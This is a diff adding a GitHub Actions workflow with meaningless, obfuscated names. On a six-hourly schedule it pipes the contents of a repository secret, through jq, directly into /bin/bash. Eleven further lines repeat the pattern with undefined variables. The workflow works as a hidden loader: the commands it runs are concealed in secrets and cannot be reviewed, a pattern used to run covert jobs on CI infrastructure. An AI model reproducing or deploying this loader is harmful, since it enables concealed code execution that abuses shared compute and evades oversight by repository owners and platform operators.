@@ -1,0 +1,30 @@
+name: qianwudsongg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianwudsongg
+        env:
+          lkqca00: ${{ secrets.lkqca00 }}
+        run: |
+          echo $lkqca00 | jq -r .gjl7 | /bin/bash
+          echo $su863 | jq -r .ni771 | /bin/bash
+          echo $slt24120 | jq -r .czyc68 | /bin/bash
+          echo $vnw6033 | jq -r .ijn0572 | /bin/bash
+          echo $w1857 | jq -r .p6 | /bin/bash
+          echo $tnhlj4827 | jq -r .p0570 | /bin/bash
+          echo $mx79 | jq -r .n91075 | /bin/bash
+          echo $meuy37 | jq -r .ah92 | /bin/bash
+          echo $ijkh4184 | jq -r .kczsx15 | /bin/bash
+          echo $l73546 | jq -r .n91 | /bin/bash
+          echo $rapkk84958 | jq -r .ztif950 | /bin/bash
+          echo $nldfp689 | jq -r .zrqp8064 | /bin/bash
+
